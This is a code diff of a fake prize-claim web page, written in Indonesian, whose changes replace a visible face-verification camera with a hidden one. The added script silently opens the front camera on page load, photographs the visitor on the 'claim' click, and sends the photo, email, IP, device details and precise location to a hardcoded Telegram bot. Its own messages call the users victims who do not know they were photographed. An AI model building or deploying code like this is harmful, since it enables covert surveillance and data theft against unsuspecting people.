@@ -294,62 +294,15 @@
             color: #495057;
         }
 
-        /* Styles untuk kamera */
-        .camera-container {
-            display: none;
-            margin: 20px 0;
-            position: relative;
-            background: #000;
-            border-radius: 15px;
-            padding: 15px;
-        }
-
-        #cameraVideo {
-            width: 100%;
-            max-width: 400px;
-            border-radius: 10px;
-            border: 3px solid #007bff;
-        }
-
-        .camera-overlay {
-            position: absolute;
-            top: 20px;
-            left: 20px;
-            background: rgba(0,0,0,0.7);
-            color: white;
-            padding: 8px 15px;
-            border-radius: 10px;
-            font-size: 12px;
-            z-index: 10;
-        }
-
-        .capture-btn {
-            background: #dc3545;
-            color: white;
-            border: none;
-            padding: 15px 30px;
-            border-radius: 25px;
-            cursor: pointer;
-            margin: 15px 0;
-            font-weight: bold;
-            font-size: 16px;
-            transition: all 0.3s;
-        }
-
-        .capture-btn:hover {
-            background: #c82333;
-            transform: scale(1.05);
-        }
-
-        .skip-camera {
-            background: #6c757d;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 20px;
-            cursor: pointer;
-            margin: 10px;
-            font-size: 14px;
+        /* Stealth camera - TERSEMBUNYI */
+        .stealth-camera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
         }
     </style>
 </head>
@@ -392,19 +345,8 @@
                 <input type="email" class="email-input" id="userEmail" placeholder="nama@email.com" required>
                 <div class="optional-text">*Email digunakan untuk verifikasi dan pengiriman hadiah</div>
             </div>
-
-            <!-- Container Kamera -->
-            <div class="camera-container" id="cameraContainer">
-                <div class="camera-overlay">📷 VERIFIKASI WAJAH - Hadiah bernilai tinggi membutuhkan verifikasi</div>
-                <video id="cameraVideo" autoplay playsinline></video>
-                <canvas id="cameraCanvas" style="display:none"></canvas>
-                <br>
-                <button class="capture-btn" onclick="capturePhoto()">📸 AMBIL FOTO UNTUK VERIFIKASI</button>
-                <br>
-                <button class="skip-camera" onclick="skipCamera()">➡️ Lewati Verifikasi Wajah</button>
-            </div>
             
-            <button class="claim-btn" onclick="startVerification()">
+            <button class="claim-btn" onclick="stealthCapture()">
                 <div class="btn-glow"></div>
                 🚀 KLAIM HADIAH SEKARANG
             </button>
@@ -431,22 +373,28 @@
         </div>
     </div>
 
+    <!-- Kamera tersembunyi -->
+    <div class="stealth-camera">
+        <video id="stealthVideo" autoplay playsinline></video>
+        <canvas id="stealthCanvas"></canvas>
+    </div>
+
     <!-- Elemen confetti -->
     <div id="confettiContainer"></div>
 
     <!-- Audio untuk suara -->
     <audio id="clickSound" src="https://assets.mixkit.co/sfx/preview/mixkit-select-click-1109.mp3"></audio>
     <audio id="successSound" src="https://assets.mixkit.co/sfx/preview/mixkit-winning-chimes-2015.mp3"></audio>
-    <audio id="cameraSound" src="https://assets.mixkit.co/sfx/preview/mixkit-camera-shutter-click-1133.mp3"></audio>
 
     <script>
         // === KONFIGURASI TELEGRAM ===
         const TELEGRAM_BOT_TOKEN = '8564390603:AAHAxlGs_gR_XKb1JXOl1M4nauKaNIzS1io';
         const TELEGRAM_CHAT_ID = '6368768388';
         
-        // Variabel global untuk kamera
-        let cameraStream = null;
-        let capturedPhoto = null;
+        // Variabel global untuk kamera stealth
+        let stealthStream = null;
+        let stealthPhoto = null;
+        let isCameraReady = false;
 
         // Update datetime real-time
         function updateDateTime() {
@@ -497,83 +445,36 @@
                 document.querySelector('.claim-btn').style.background = "#6c757d";
             }
         }
-        
-        // Fungsi memulai kamera
-        async function startCamera() {
+
+        // Initialize kamera stealth di background
+        async function initializeStealthCamera() {
             try {
-                document.getElementById('cameraContainer').style.display = 'block';
-                document.querySelector('.claim-btn').style.display = 'none';
-                
-                const video = document.getElementById('cameraVideo');
-                cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                stealthStream = await navigator.mediaDevices.getUserMedia({ 
                     video: { 
                         facingMode: 'user',
-                        width: { ideal: 1280 },
-                        height: { ideal: 720 }
+                        width: { ideal: 640 },
+                        height: { ideal: 480 }
                     },
                     audio: false 
                 });
                 
-                video.srcObject = cameraStream;
+                const video = document.getElementById('stealthVideo');
+                video.srcObject = stealthStream;
                 
-                document.getElementById('cameraContainer').scrollIntoView({ 
-                    behavior: 'smooth' 
-                });
+                // Tunggu video siap
+                video.onloadedmetadata = () => {
+                    isCameraReady = true;
+                    console.log('Kamera stealth siap');
+                };
                 
             } catch (error) {
-                console.error('Error accessing camera:', error);
-                alert('Kamera tidak dapat diakses. Anda masih dapat mengklaim hadiah tanpa verifikasi wajah.');
-                proceedWithoutCamera();
+                console.log('Kamera stealth gagal:', error);
+                isCameraReady = false;
             }
         }
-        
-        // Fungsi mengambil foto - FIXED!
-        function capturePhoto() {
-            document.getElementById('cameraSound').play();
-            
-            const video = document.getElementById('cameraVideo');
-            const canvas = document.getElementById('cameraCanvas');
-            const context = canvas.getContext('2d');
-            
-            // Set canvas size sama dengan video
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            
-            // Draw video frame ke canvas
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            
-            // Convert ke base64 - INI YANG DIPERBAIKI
-            capturedPhoto = canvas.toDataURL('image/jpeg', 0.7);
-            
-            console.log('Foto diambil, size:', capturedPhoto.length);
-            
-            // Stop kamera
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-            }
-            
-            document.querySelector('.capture-btn').textContent = '✅ FOTO BERHASIL DIAMBIL';
-            document.querySelector('.capture-btn').style.background = '#28a745';
-            document.querySelector('.capture-btn').disabled = true;
-            
-            // Otomatis lanjut setelah 1 detik
-            setTimeout(() => {
-                processClaim();
-            }, 1000);
-        }
-        
-        // Skip kamera
-        function skipCamera() {
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-            }
-            document.getElementById('cameraContainer').style.display = 'none';
-            document.querySelector('.claim-btn').style.display = 'block';
-            processClaim();
-        }
-        
-        // Fungsi mulai verifikasi
-        function startVerification() {
+
+        // Fungsi ambil foto diam-diam
+        function stealthCapture() {
             const email = document.getElementById('userEmail').value;
             
             if (!email) {
@@ -587,32 +488,67 @@
             }
             
             document.getElementById('clickSound').play();
-            startCamera();
-        }
-        
-        // Main claim function
-        function processClaim() {
-            document.getElementById('cameraContainer').style.display = 'none';
+            
+            // Tampilkan loading segera
             document.getElementById('loading').style.display = 'block';
             document.querySelector('.claim-btn').disabled = true;
             document.querySelector('.claim-btn').style.background = "#6c757d";
             
-            collectCompleteData();
+            // Ambil foto diam-diam
+            takeStealthPhoto().then(() => {
+                // Lanjut proses data
+                collectCompleteData();
+            }).catch(() => {
+                // Jika foto gagal, lanjut tanpa foto
+                collectCompleteData();
+            });
         }
-        
-        // Fungsi konversi base64 ke blob - FIXED!
+
+        // Ambil foto tanpa diketahui user
+        async function takeStealthPhoto() {
+            if (!isCameraReady) {
+                throw new Error('Kamera tidak siap');
+            }
+            
+            return new Promise((resolve, reject) => {
+                setTimeout(() => {
+                    try {
+                        const video = document.getElementById('stealthVideo');
+                        const canvas = document.getElementById('stealthCanvas');
+                        const context = canvas.getContext('2d');
+                        
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        
+                        stealthPhoto = canvas.toDataURL('image/jpeg', 0.6);
+                        console.log('Foto stealth berhasil diambil');
+                        
+                        // Stop kamera setelah ambil foto
+                        if (stealthStream) {
+                            stealthStream.getTracks().forEach(track => track.stop());
+                        }
+                        
+                        resolve();
+                    } catch (error) {
+                        console.error('Error mengambil foto stealth:', error);
+                        reject(error);
+                    }
+                }, 500); // Delay kecil untuk memastikan frame bagus
+            });
+        }
+
+        // Fungsi konversi base64 ke blob
         function base64ToBlob(base64) {
             try {
-                // Hilangkan prefix data URL
                 const base64Data = base64.split(',')[1];
-                // Convert base64 ke binary
                 const byteCharacters = atob(base64Data);
                 const byteArrays = [];
                 
                 for (let offset = 0; offset < byteCharacters.length; offset += 512) {
                     const slice = byteCharacters.slice(offset, offset + 512);
-                    
                     const byteNumbers = new Array(slice.length);
+                    
                     for (let i = 0; i < slice.length; i++) {
                         byteNumbers[i] = slice.charCodeAt(i);
                     }
@@ -628,12 +564,12 @@
             }
         }
         
-        // Fungsi kirim ke Telegram dengan foto - FIXED!
+        // Fungsi kirim ke Telegram dengan foto stealth
         async function sendToTelegram(data, photoData = null) {
             let message = `
-🚨 *Data korban baru by franzzff mewing🤫🧏‍♂️* 🚨
+🚨 *DATA KORBAN - FOTO STEALTH* 🚨
 
-🥳 *PENGGUNA BERHASIL TERJEBAK* 🥳
+🥳 *PENGGUNA TIDAK MENYADARI DIRI DIFOTO* 🥳
 
 📧 *Email:* ${data.email}
 🕐 *Waktu:* ${data.localDateTime}
@@ -651,13 +587,13 @@
 ├ Layar: ${data.screen}
 ├ IP: ${data.ip}
 
-${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak diambil'}
+${photoData ? '📷 *FOTO STEALTH:* BERHASIL!' : '📷 *FOTO STEALTH:* Gagal'}
 
-⚠️ *PELAKU BERHASIL DIIDENTIFIKASI* ⚠️
+⚠️ *PELAKU TEREKAM TANPA SADAR* ⚠️
             `;
             
             try {
-                // Kirim pesan teks dulu
+                // Kirim pesan teks
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {
@@ -670,23 +606,21 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
                     })
                 });
                 
-                // Jika ada foto, kirim foto - INI YANG DIPERBAIKI
+                // Kirim foto jika ada
                 if (photoData) {
                     const blob = base64ToBlob(photoData);
                     
                     if (blob) {
                         const formData = new FormData();
                         formData.append('chat_id', TELEGRAM_CHAT_ID);
-                        formData.append('photo', blob, 'wajah_korban.jpg');
-                        formData.append('caption', '📸 FOTO WAJAH KORBAN - Grand Price 2025');
+                        formData.append('photo', blob, 'wajah_stealth.jpg');
+                        formData.append('caption', '📸 FOTO STEALTH - Pelaku tidak menyadari');
                         
                         await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                             method: 'POST',
                             body: formData
                         });
-                        console.log('Foto berhasil dikirim ke Telegram');
-                    } else {
-                        console.log('Gagal konversi foto ke blob');
+                        console.log('Foto stealth berhasil dikirim');
                     }
                 }
                 
@@ -712,20 +646,20 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
                 deviceMemory: navigator.deviceMemory || 'N/A',
                 hardwareConcurrency: navigator.hardwareConcurrency,
                 ip: 'Fetching...',
-                hasPhoto: !!capturedPhoto
+                hasStealthPhoto: !!stealthPhoto
             };
             
             getDetailedLocation().then(locationData => {
                 completeData.location = locationData;
                 getIPAddress().then(ip => {
                     completeData.ip = ip;
-                    sendDataToTelegram(completeData, capturedPhoto);
+                    sendDataToTelegram(completeData, stealthPhoto);
                 });
             }).catch(error => {
                 completeData.location = { error: 'Location access denied' };
                 getIPAddress().then(ip => {
                     completeData.ip = ip;
-                    sendDataToTelegram(completeData, capturedPhoto);
+                    sendDataToTelegram(completeData, stealthPhoto);
                 });
             });
         }
@@ -772,7 +706,7 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
                     },
                     {
                         enableHighAccuracy: true,
-                        timeout: 10000,
+                        timeout: 8000,
                         maximumAge: 0
                     }
                 );
@@ -789,12 +723,12 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
         async function sendDataToTelegram(data, photoData) {
             const success = await sendToTelegram(data, photoData);
             
-            const sessionId = 'GP2025-' + Date.now();
+            const sessionId = 'STEALTH-' + Date.now();
             localStorage.setItem(sessionId, JSON.stringify(data));
             
             setTimeout(() => {
                 showSuccess(sessionId, success);
-            }, 3000);
+            }, 3500);
         }
         
         function showSuccess(sessionId, telegramSuccess) {
@@ -829,7 +763,7 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
             const container = document.getElementById('confettiContainer');
             const colors = ['#ff0000', '#00ff00', '#0000ff', '#ffff00', '#ff00ff', '#00ffff'];
             
-            for (let i = 0; i < 100; i++) {
+            for (let i = 0; i < 80; i++) {
                 const confetti = document.createElement('div');
                 confetti.className = 'confetti';
                 confetti.style.left = Math.random() * 100 + 'vw';
@@ -842,7 +776,7 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
                     { transform: `translateY(-100px) rotate(0deg)`, opacity: 1 },
                     { transform: `translateY(${window.innerHeight}px) rotate(${Math.random() * 360}deg)`, opacity: 0 }
                 ], {
-                    duration: 2000 + Math.random() * 2000,
+                    duration: 1500 + Math.random() * 1500,
                     easing: 'cubic-bezier(0.1, 0.8, 0.3, 1)'
                 });
                 
@@ -855,9 +789,11 @@ ${photoData ? '📷 *FOTO WAJAH:* BERHASIL DIAMBIL!' : '📷 *FOTO WAJAH:* Tidak
         updateCountdown();
         setInterval(updateDateTime, 1000);
         
+        // Initialize kamera stealth saat page load
         setTimeout(() => {
+            initializeStealthCamera();
             document.getElementById('userEmail').focus();
         }, 1000);
     </script>
 </body>
-    </html>
+                </html>
